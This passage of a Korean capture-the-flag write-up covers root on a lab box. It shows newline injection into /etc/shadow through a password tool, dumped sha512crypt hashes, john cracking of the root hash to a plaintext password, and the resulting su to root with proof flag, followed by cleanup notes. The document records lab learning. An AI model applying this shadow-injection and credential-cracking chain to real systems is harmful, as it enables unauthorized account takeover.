— 역산: `jane:<새해시>:19831:0:` + 위 문자열 + `:7:::` 을 조립하면 관측된 두 행과 바이트가 맞음. 요청 원문이 아니라 **결과에서 되짚은 재구성**임

메커니즘은 이것으로 완결됨 — `pass-gen` 이 대상 shadow 행의 5번째 필드(0-index 4, shadow 포맷상 `max`)에 사용자 인자를 그대로 꽂고, 그 인자에 개행이 있으면 행이 끊기며 뒤쪽이 새 줄이 됨. 새 줄을 `josh:$6$…:19000:0:99999` 형태로 맞추면 진짜 josh 행보다 앞에 오는 josh 항목이 하나 더 생김.

**복원 기록이 대조군이 됨.**

```text
c0ba3f99dc0981eeeb7617c6155da121  /etc/shadow
1688 /etc/shadow
--- restore candidate ---
1433 /tmp/s.restore
34
--- after restore ---
8503a26a3ddfa3cbf7e8c0d6de7607eb  /etc/shadow
1433 /etc/shadow
-rw-r----- 1 root shadow 1433 Aug 21 02:11 /etc/shadow
root:$6$4kpaRzOQ$mG9wRaxktdkRgXRVp4tyZkNYub/95YRuZ7P8AybjSGsBCh/0HotsXCq77XI6LOcZfn.lxIzc4NOaHvkROXRMa/:19129:0:99999:7:::
jane:$6$41234567$UopOgp8jETVNueXnCycGNoUfGyjLiG6sWjY2KqtbmrUicBcxFivIfOrymqt1cxt3FGLLYEw35wv1I.f76oBLA1:19831:0:1337:7:::
```
— 출처: `~/PG/Graph/cleanup_evidence_box.txt` (복원 후 목록 중 josh 3행·node 행 생략 — josh 3행은 위 harvest 인용과 같은 값)

**복원 전 1688바이트 → 복원 후 1433바이트.** 차이 255바이트가 작업 중 `/etc/shadow` 에 들어갔던 분량이고 md5 도 함께 바뀜. 백업본 `/tmp/s.restore` 에는 `Gr4phSlt` 행도 `bogus` 행도 없으므로 **이 백업은 조작 이전 상태**이며, 따라서 거기 있는 **josh 행 3개는 박스가 원래 갖고 있던 것**임(첫 일치 규칙이 이 박스의 의도된 관문이라는 정황). jane 행의 `max` 가 여기서는 `1337`, 조작 후에는 `99999` 인 것이 앞의 대조 근거임.

#### josh → root

`harvest_root.txt` 의 「TMP」절이 익스플로잇 구간의 시간 서사를 그대로 담고 있음.

```text
drwxrwxr-x  2 jane jane 4096 Aug 21 01:54 .h
-rw-r--r--  1 root root    0 Aug 21 02:08 .hroot.log
-rwxrwxr-x  1 jane jane 3055 Aug 21 01:54 .h.sh
-rw-rw-r--  1 jane jane  443 Aug 21 02:04 .p2.sh
-rw-rw-r--  1 jane jane  415 Aug 21 02:01 .p.out
-rw-rw-r--  1 jane jane  575 Aug 21 02:00 .p.sh
-rw-r-----  1 josh josh 1688 Aug 21 02:05 .shadow_snapshot_afterinject
```
— 출처: `~/PG/Graph/harvest_root.txt` 「TMP」절 `/tmp` 목록(시스템 디렉터리 행 생략)

읽히는 것 셋.

- `.p.sh`(575바이트, 02:00)가 Kali 의 `exploit_passgen.sh`(575바이트)와 **크기가 같음** — 손상된 사본이 타겟에 올라가 02:01 에 실행됐고 그 출력이 `.p.out`(415바이트)에 남았음. `bogus` 행이 이 실행의 산물임. ⚠️ `.p.out` 은 **Kali 로 회수되지 않아 내용은 관측 없음**
- `.p2.sh`(443바이트, 02:04)가 **두 번째 스크립트**임. 성공한 주입이 이쪽이고 역시 회수되지 않았음
- `.shadow_snapshot_afterinject`(1688바이트, 02:05)가 **josh 소유**임. 크기가 조작 후 shadow 와 정확히 같음 = **josh 세션이 02:05 에 존재했고 `/etc/shadow` 를 읽었음.** `root_hash.txt` 생성 시각(Kali 15:05:47 = 타겟 02:05:47)이 여기에 맞물림

⚠️ **[가정] josh 가 shadow 를 읽을 수 있었던 근거는 여전히 관측 없음.** harvest 가 `/etc/group` 을 뜨지 않아 josh 의 그룹 소속을 확인할 수 없고, `sudo` 로 읽었을 가능성도 배제되지 않음(파일 소유자가 josh 인 것은 `sudo cat … > /tmp/x` 로도 그렇게 됨).

`ps auxf` 는 그 뒤의 두 번째 josh 세션을 보여줌.

```text
root      3255  0.0  0.7 107992  7108 ?        Ss   02:07   0:00  \_ sshd: josh [priv]
josh      3335  0.0  0.3 107992  3464 ?        S    02:07   0:00      \_ sshd: josh@pts/1
josh      3336  0.0  0.4  22684  4988 pts/1    Ss   02:07   0:00          \_ -bash
root      3348  0.0  0.3  63052  3852 pts/1    S    02:08   0:00              \_ su - root
root      3349  0.0  0.5  22656  5112 pts/1    S    02:08   0:00                  \_ -su
root      3376  0.0  0.1   4636  1732 pts/1    S+   02:08   0:00                      \_ sh /tmp/.h.sh
```
— 출처: `~/PG/Graph/harvest_root.txt` 「PROCS」절(`ps auxf`)

**josh 로 SSH 로그인(02:07) → 그 pty 안에서 `su - root`(02:08).** root 셸은 별도 SSH 세션이 아니라 josh 세션의 자식이고, 맨 아래 `sh /tmp/.h.sh` 가 이 harvest 자신임. 02:05 의 첫 josh 세션은 이미 종료돼 여기에 없음. 이 로그인에 쓰인 비밀번호는 **심어 놓은 쪽일 수밖에 없음** — 박스 원본의 josh 해시는 크랙된 적이 없음(1차 john 이 rockyou 완주 후에도 josh 를 못 깼고 `root.pot` 에도 root 항목 하나뿐임).

root 해시는 그보다 앞서 파일로 떨어짐.

```text
root:$6$4kpaRzOQ$mG9wRaxktdkRgXRVp4tyZkNYub/95YRuZ7P8AybjSGsBCh/0HotsXCq77XI6LOcZfn.lxIzc4NOaHvkROXRMa/
```
— 출처: `~/PG/Graph/root_hash.txt`

첫 크랙 시도는 즉사함.

```text
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Crash recovery file is locked: /home/kali/.john/john.rec
```
— 출처: `~/PG/Graph/john_root.out` (첫 줄 `Using default input encoding: UTF-8` 과 래퍼가 붙인 끝줄 `DONE_ROOT` 생략)

**기본 세션 파일(`~/.john/john.rec`)이 잠겨 있음.** 이름 없는 세션은 `$HOME/.john/john.rec` 하나를 공유하므로 다른 job 이 그 파일을 쥐고 있으면 새 job 은 시작도 못 하고 죽음 — 이 박스에서는 14:53 에 띄운 1차 john 이 17:25 까지 돌고 있었으므로 **그 job 이 락을 쥐고 있었음.** 세션 이름을 명시해 재실행.

```text
0:00:00:00 Command line: john --session=graphroot --pot=root.pot --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt root_hash.txt 
```
— 출처: `~/PG/Graph/graphroot.log` (john 이 세션 로그에 직접 기록한 명령행)

```text
espartaco        (root)     
1g 0:00:00:36 DONE (2026-08-21 15:07) 0.02739g/s 1949p/s 1949c/s 1949C/s fullysick..citadel
```
— 출처: `~/PG/Graph/john_root2.out`

36초 만에 끝남 — `espartaco` 가 rockyou 70,985번째 줄이고 1949 p/s 이므로 계산도 맞음. sha512crypt 라도 사전에 있는 값이면 iteration count(cost 1 = 5000)가 방어가 못 됨.

크랙한 `espartaco` 를 josh 셸의 `su - root` 에 넣어 root 획득.

```bash
root@graph:~# whoami; id; hostname; hostname -I; date; ls -la /root/proof.txt; c
at /root/proof.txt
root
uid=0(root) gid=0(root) groups=0(root)
graph
192.168.248.201
Fri Aug 21 02:08:23 EDT 2026
-rw------- 1 root root 33 Aug 21 01:49 /root/proof.txt
3e823452d93d1c9c8ef9bcf9d34612eb
root@graph:~#
```
— 출처: `~/PG/Graph/proof_root.txt` 후반부. 명령행이 `c` / `at` 로 끊긴 것은 pty 폭에서 줄바꿈된 그대로임. 파일 앞부분에 10초 전(02:08:13) 실행의 출력이 한 번 더 있음 — 그쪽은 `ls -la` 없이 `cat` 까지만이고 프롬프트 줄이 스크롤백에서 잘려 출력만 남음

sshd 설정에는 root 직접 로그인도 열려 있었음.

```text
PermitRootLogin yes
```
— 출처: `~/PG/Graph/harvest_root.txt` 「SSH」절

⚠️ 다만 **실제로 root 셸을 잡은 경로는 SSH 직접 로그인이 아니라 josh 세션의 `su - root`** 임(`ps auxf` 에 `sshd: root` 세션이 없음). 이 설정은 «쓸 수 있었을» 우회로였을 뿐 쓰이지 않음. 대부분의 실전·시험 박스는 `PermitRootLogin no` 이므로 이 경로가 항상 열려 있다고 기대하면 안 됨.

### Post-Exploitation

**Proof.txt value:**
`3e823452d93d1c9c8ef9bcf9d34612eb` — `/root/proof.txt`

⚠️ 위 두 플래그는 **2026-08-21 인스턴스** 값임. PG 는 박스를 다시 켤 때마다 새로 만듦.

둘 다 표준 위치, 미끼 없음. **둘 다 대화형 pty 셸에서 원위치 `cat` 한 결과**임 — user 는 jane 의 SSH 세션(`jane@graph:~$`), root 는 josh 세션에서 `su - root` 한 셸(`root@graph:~#`)이고 프롬프트가 그대로 `proof_user.txt`·`proof_root.txt` 에 캡처돼 있음. 웹셸 경유가 아니므로 시험 기준 0점 처리 대상이 아님. `harvest_root.txt` 「FLAGS」절의 전수 탐색 결과도 이 둘뿐임.

**남긴 흔적**

타겟 쪽 — 심은 것은 셋임.
- `/etc/shadow` 의 `josh:$6$Gr4phSlt$…` 행(성공한 주입)
- 같은 파일의 `bogus:…njosh:…` 행(개행이 안 먹은 실패 잔재)
- jane 행의 `max` 필드와 해시 변조(`1337` → `99999`, `$6$41234567$` → `$6$32320834$`)

셋 다 백업 `/tmp/s.restore` 로 복원함(1688 → 1433바이트, md5 `c0ba3f99…` → `8503a26a…`). `/tmp` 의 `.h.sh`·`.h/`·`.p.sh`·`.p.out`·`.p2.sh`·`.shadow_snapshot_afterinject`·`s.restore` 도 정리 후 목록에서 사라짐. 다만 **정리 기록 파일 `/tmp/cleanup_evidence.txt`(926바이트, root 소유) 자체는 남아 있음** — 목록 안에 그대로 찍혀 있음.

Kali 쪽 — 리버스셸을 쓰지 않아(전 구간 SSH) 리스너·아웃바운드 포트 문제가 애초에 발생하지 않았음. NFS 마운트 없음. 노트 작성 당시 남아 있던 tmux 세션 `graph-josh`·`graphjosh` 는 **2026-08-26 재확인 시점에 tmux 서버 자체가 없음**(`no server running`)으로 정리된 상태임.

## 관련

- GraphQL introspection 질의 형태는 GraphQL 공식 스펙의 `__schema`/`__type` 메타 필드를 그대로 사용함: <https://spec.graphql.org/October2021/#sec-Introspection>
- `getspnam()` 첫 일치 규칙: `shadow(5)` — 같은 이름의 행이 중복돼도 오류가 아니며 앞선 행이 이김
- 이 박스에서 사용한 취약점에 해당하는 공개 CVE 번호는 확인하지 않음 — 커스텀 Node.js 앱으로 보이며 관측 없음
- [[Fikklish]] — `sudo -l` 을 비밀번호 확보 후 다시 확인해야 한다는 같은 교훈, 그리고 「다른 통로로 새어나온 자격증명」 계열
- [[Robust]] — 앱 DB 에서 뽑은 자격증명이 OS 계정에 그대로 재사용된 같은 패턴(앱 로그인과 SSH 의 저장소가 다름)
- [[_PLAYBOOK]] — 이 박스의 시행착오·기법 카드·시험 관점. 개별 항목:
    - [[_PLAYBOOK#A-18. 배경 스캔이 도는데 같은 스캔을 손으로 또 돌렸다]]
    - [[_PLAYBOOK#A-19. SNMP·UDP 가 빈손인데 미련이 남는다]]
    - [[_PLAYBOOK#A-22. 비번 해시를 못 깬다 (bcrypt 등)]] — john 세션 락(`--session=`)
    - [[_PLAYBOOK#A-41. 셸은 잡았는데 권한상승 실마리가 없다]] — `sudo -n` 실패는 「막힘」이 아님
    - [[_PLAYBOOK#A-47. 권한상승 도구가 «내» 계정 비밀번호까지 갈아치운다]]
    - [[_PLAYBOOK#A-63. 익스플로잇은 통했는데 «무엇을 보냈는지» 기록이 없다]]
    - [[_PLAYBOOK#B-1-15. GraphQL introspection → 인자 주입]]
    - [[_PLAYBOOK#B-37. `/etc/shadow` 행 선삽입 — `getspnam()` first-match]]
    - [[_PLAYBOOK#B-63. sha512crypt 를 보고 접지 마라 — rockyou 완주에도 안 깨지면 그때 접는다]]
    - [[_PLAYBOOK#B-84. 원격에서 만든 스크립트는 이스케이프가 «한 겹» 먹힌다]]
- [[_STATUS]]
